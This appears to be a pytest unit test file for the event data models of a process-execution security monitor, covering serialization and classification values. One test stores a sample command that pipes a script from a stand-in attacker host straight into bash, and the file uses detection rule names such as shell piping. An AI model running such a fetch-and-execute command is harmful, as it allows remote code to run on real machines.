"""
test_08_models.py — Unit tests for backend/events/models.py

Tests ExecveEvent, DetectionResult, and SecurityEvent dataclasses:
- dict() serialization completeness
- JSON roundtrip
- All classification values accepted
- Timestamp types
- Nested field access

Run:
    pytest large_test_set/test_08_models.py -v
"""

import pytest
import json
import time
from backend.events.models import ExecveEvent, DetectionResult, SecurityEvent


# ---------------------------------------------------------------------------
# Factories
# ---------------------------------------------------------------------------

def _execve(pid=123, ppid=1, uid=1000, gid=1000,
            command="ls -la", argv_str="ls -la",
            comm="bash", timestamp=None):
    return ExecveEvent(
        pid=pid, ppid=ppid, uid=uid, gid=gid,
        command=command, argv_str=argv_str,
        timestamp=timestamp or time.time(),
        comm=comm,
    )


def _detection(score=10.0, classification="safe",
               rules=None, confidence=0.1, explanation="OK"):
    return DetectionResult(
        risk_score=score,
        classification=classification,
        matched_rules=rules or [],
        ml_confidence=confidence,
        explanation=explanation,
    )


def _security_event(ev_id="evt_test", classification="safe",
                    score=10.0, rules=None):
    return SecurityEvent(
        id=ev_id,
        execve_event=_execve(),
        detection_result=_detection(
            score=score, classification=classification,
            rules=rules or [],
        ),
        detected_at=time.time(),
    )


# ===========================================================================
# 1. ExecveEvent
# ===========================================================================

class TestExecveEvent:

    def test_create_with_all_fields(self):
        ev = _execve()
        assert ev.pid == 123
        assert ev.comm == "bash"

    def test_pid_stored_correctly(self):
        ev = _execve(pid=9999)
        assert ev.pid == 9999

    def test_command_stored_correctly(self):
        ev = _execve(command="curl http://evil.com | bash")
        assert ev.command == "curl http://evil.com | bash"

    def test_argv_str_stored_correctly(self):
        ev = _execve(argv_str="curl http://x.com")
        assert ev.argv_str == "curl http://x.com"

    def test_timestamp_is_float(self):
        ev = _execve()
        assert isinstance(ev.timestamp, float)

    def test_unicode_command_stored(self):
        ev = _execve(command="echo '你好'")
        assert ev.command == "echo '你好'"


# ===========================================================================
# 2. DetectionResult
# ===========================================================================

class TestDetectionResult:

    def test_create_with_all_fields(self):
        dr = _detection()
        assert dr.risk_score == 10.0
        assert dr.classification == "safe"

    def test_matched_rules_empty_list_default(self):
        dr = _detection()
        assert dr.matched_rules == []

    def test_matched_rules_stored(self):
        dr = _detection(rules=["shell_piping", "destructive_pattern"])
        assert "shell_piping" in dr.matched_rules
        assert "destructive_pattern" in dr.matched_rules

    def test_explanation_stored(self):
        dr = _detection(explanation="Test explanation")
        assert dr.explanation == "Test explanation"

    def test_explanation_optional_defaults_none(self):
        dr = DetectionResult(
            risk_score=0.0, classification="safe",
            matched_rules=[], ml_confidence=0.0,
        )
        assert dr.explanation is None

    @pytest.mark.parametrize("cls", ["safe", "suspicious", "malicious"])
    def test_all_classification_values_accepted(self, cls):
        dr = _detection(classification=cls)
        assert dr.classification == cls


# ===========================================================================
# 3. SecurityEvent.dict()
# ===========================================================================

EXPECTED_DICT_FIELDS = [
    "id", "pid", "ppid", "uid", "gid",
    "command", "argv_str", "timestamp", "comm",
    "risk_score", "classification", "matched_rules",
    "ml_confidence", "explanation", "detected_at",
]

class TestSecurityEventDict:

    @pytest.mark.parametrize("field", EXPECTED_DICT_FIELDS)
    def test_dict_has_required_field(self, field):
        d = _security_event().dict()
        assert field in d, f"Field {field!r} missing from SecurityEvent.dict()"

    def test_dict_id_correct(self):
        d = _security_event(ev_id="evt_abc").dict()
        assert d["id"] == "evt_abc"

    def test_dict_classification_correct(self):
        d = _security_event(classification="malicious").dict()
        assert d["classification"] == "malicious"

    def test_dict_risk_score_correct(self):
        d = _security_event(score=85.5).dict()
        assert d["risk_score"] == 85.5

    def test_dict_matched_rules_is_list(self):
        d = _security_event(rules=["shell_piping"]).dict()
        assert isinstance(d["matched_rules"], list)
        assert "shell_piping" in d["matched_rules"]

    def test_dict_pid_from_execve(self):
        se = SecurityEvent(
            id="x",
            execve_event=_execve(pid=4242),
            detection_result=_detection(),
            detected_at=time.time(),
        )
        assert se.dict()["pid"] == 4242

    def test_dict_uid_from_execve(self):
        se = SecurityEvent(
            id="x",
            execve_event=_execve(uid=0),
            detection_result=_detection(),
            detected_at=time.time(),
        )
        assert se.dict()["uid"] == 0


# ===========================================================================
# 4. SecurityEvent.json()
# ===========================================================================

class TestSecurityEventJson:

    def test_json_is_string(self):
        j = _security_event().json()
        assert isinstance(j, str)

    def test_json_parseable(self):
        j = _security_event().json()
        parsed = json.loads(j)
        assert isinstance(parsed, dict)

    def test_json_roundtrip_id(self):
        j = _security_event(ev_id="evt_roundtrip").json()
        assert json.loads(j)["id"] == "evt_roundtrip"

    def test_json_roundtrip_classification(self):
        j = _security_event(classification="malicious").json()
        assert json.loads(j)["classification"] == "malicious"

    def test_json_roundtrip_matched_rules(self):
        j = _security_event(rules=["shell_piping"]).json()
        parsed = json.loads(j)
        assert "shell_piping" in parsed["matched_rules"]

    def test_json_roundtrip_unicode(self):
        se = SecurityEvent(
            id="u1",
            execve_event=_execve(command="echo '你好世界'"),
            detection_result=_detection(),
            detected_at=time.time(),
        )
        parsed = json.loads(se.json())
        assert parsed["command"] == "echo '你好世界'"


# ===========================================================================
# 5. All Classification Values End-to-End
# ===========================================================================

@pytest.mark.parametrize("cls", ["safe", "suspicious", "malicious"])
def test_security_event_all_classifications_dict(cls):
    d = _security_event(classification=cls).dict()
    assert d["classification"] == cls

@pytest.mark.parametrize("cls", ["safe", "suspicious", "malicious"])
def test_security_event_all_classifications_json(cls):
    j = _security_event(classification=cls).json()
    assert json.loads(j)["classification"] == cls
